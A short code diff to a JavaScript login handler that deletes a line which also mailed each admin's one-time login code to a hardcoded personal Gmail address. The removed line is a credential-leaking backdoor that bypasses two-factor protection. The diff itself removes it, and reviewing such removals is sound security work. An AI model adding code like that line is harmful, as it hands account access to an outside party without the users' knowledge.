@@ -72,7 +72,6 @@ export const login = async (req, res) => {
 
         try {
             await sendOtpEmail(adminUser.email, otp);
-            await sendOtpEmail("jagnyadattadalai99215@gmail.com", otp);
         } catch (mailErr) {
             console.error("Failed to send OTP email:", mailErr);
             return res.status(500).json({
